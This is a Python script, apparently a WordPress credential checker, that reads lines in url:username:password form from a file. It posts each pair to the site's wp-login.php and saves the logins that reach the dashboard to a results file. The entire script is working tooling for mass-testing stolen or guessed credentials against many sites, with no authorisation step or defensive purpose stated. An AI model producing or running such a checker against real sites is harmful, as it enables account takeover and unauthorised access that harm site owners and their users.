import requests
from colorama import Fore, Style, init

def read_file(file_name):
    with open(file_name, 'r') as file:
        lines = [line.strip() for line in file.readlines()]
    return lines

def check_login(url, username, password, success_file, fail_file):
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In'
    }

    try:
        response = requests.post(url, data=login_data)

        if response.ok:
            if "Dashboard" in response.text:
                print(f"{Fore.GREEN}Login successful for: {url}{Style.RESET_ALL}")
                success_file.write(f"{url}:{username}:{password}\n")
            else:
                print(f"{Fore.RED}Login failed for: {url}{Style.RESET_ALL}")
                fail_file.write(f"{url}:{username}:{password}\n")
        else:
            print(f"{Fore.RED}Connection failed for: {url} with response code: {response.status_code}{Style.RESET_ALL}")
            fail_file.write(f"{url}:{username}:{password}\n")
    except Exception as e:
        print(f"{Fore.RED}Error connecting to {url}: {e}{Style.RESET_ALL}")
        fail_file.write(f"{url}:{username}:{password}\n")

def main():
    init(autoreset=True)

    print(f"""{Fore.CYAN}
 ____  ____  ____  _____   ____ ___  _   _____ ____  ____  ____  _     _  _     
/   _\/  _ \/  _ \/  __/  /  __\\  \//  /  __//  _ \/  __\/  _ \/ \ /|/ \/ \__/|
|  /  | / \|| | \||  \    | | // \  /   |  \  | | //|  \/|| / \|| |_||| || |\/||
|  \__| \_/|| |_/||  /_   | |_\\ / /    |  /_ | |_\\|    /| |-||| | ||| || |  ||
\____/\____/\____/\____\  \____//_/     \____\\____/\_/\_\\_/ \|\_/ \|\_/\_/  \|

{Style.RESET_ALL}""")

    print(f"""{Fore.YELLOW}
- Please put the domains in the file named "{Fore.GREEN}domain.txt{Fore.YELLOW}".
- Each line must be in this format:
  {Fore.GREEN}https://site.com/wp-login.php:username:password{Fore.YELLOW}
- Successful login results will be saved in "{Fore.GREEN}successful_logins.txt{Fore.YELLOW}".
- Failed login results will be saved in "{Fore.GREEN}failed_logins.txt{Fore.YELLOW}".

GitHub : {Fore.CYAN}https://github.com/codebyebrahim{Fore.YELLOW}
{Style.RESET_ALL}""")

    file_name = 'domain.txt'
    lines = read_file(file_name)

    with open('successful_logins.txt', 'w') as success_file, open('failed_logins.txt', 'w') as fail_file:
        for line in lines:
            protocol_split = line.split('://')
            if len(protocol_split) == 2:
                protocol = protocol_split[0] + '://'
                rest = protocol_split[1]
                parts = rest.split(':')
                if len(parts) >= 3:
                    url = protocol + parts[0].strip()
                    username = parts[1].strip()
                    password = parts[2].strip()
                    check_login(url, username, password, success_file, fail_file)
                else:
                    print(f"{Fore.RED}Invalid line format: {line}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Invalid line format: {line}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
